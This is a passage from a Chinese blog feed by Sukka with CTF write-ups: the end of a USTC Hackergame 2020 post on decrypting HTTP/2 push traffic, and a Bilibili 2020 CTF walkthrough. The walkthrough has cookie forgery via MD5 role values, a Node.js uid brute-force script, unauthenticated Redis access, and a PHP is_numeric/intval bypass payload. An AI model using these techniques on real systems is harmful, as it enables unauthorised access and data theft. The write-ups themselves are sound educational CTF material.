进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span 